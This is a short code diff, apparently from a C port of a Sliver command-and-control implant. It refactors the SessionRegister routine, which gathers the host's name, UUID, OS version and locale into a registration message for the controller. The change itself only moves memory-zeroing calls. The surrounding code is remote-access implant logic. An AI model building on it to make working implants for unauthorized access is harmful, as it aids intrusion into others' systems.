@@ -66,6 +66,10 @@ BOOL SessionRegister
 	PPBElement ElementList[18];
 	ENVELOPE RegisterEnvelope;
 
+	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
+	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
+	SecureZeroMemory(ElementList, sizeof(ElementList));
+	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 	lpUUID = GetHostUUID();
 	if (lpUUID == NULL) {
 		goto CLEANUP;
@@ -87,14 +91,12 @@ BOOL SessionRegister
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
 	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
 	if (!GetOsVersion(&OsVersion)) {
 		LOG_ERROR("GetOsVersion", GetLastError());
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
 	GetNativeSystemInfo(&SystemInfo);
 	lpVersion = ALLOC(0x100);
 	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
@@ -127,7 +129,6 @@ BOOL SessionRegister
 	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
-	SecureZeroMemory(ElementList, sizeof(ElementList));
 	ElementList[0] = CreateBytesElement(pSession->pGlobalConfig->szSliverName, lstrlenA(pSession->pGlobalConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
@@ -145,7 +146,6 @@ BOOL SessionRegister
 	ElementList[17] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
 	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
-	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	RegisterEnvelope.uType = MsgRegister;
 	pFinalElement->pMarshaledData = NULL;
